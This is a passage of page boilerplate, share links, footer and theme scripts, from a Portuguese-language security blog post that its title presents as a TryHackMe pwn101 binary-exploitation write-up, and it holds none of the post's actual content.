3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM on telegram" href="https://telegram.me/share/url?text=Uma%20introdu%c3%a7%c3%a3o%20pr%c3%a1tica%20a%20Explora%c3%a7%c3%a3o%20de%20Bin%c3%a1rios%20com%20Engenharia%20Reversa%3a%20writeUp%20da%20sala%20pwn101%20THM&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM on ycombinator" href="https://news.ycombinator.com/submitlink?t=Uma%20introdu%c3%a7%c3%a3o%20pr%c3%a1tica%20a%20Explora%c3%a7%c3%a3o%20de%20Bin%c3%a1rios%20com%20Engenharia%20Reversa%3a%20writeUp%20da%20sala%20pwn101%20THM&u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Blog do GRIS</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>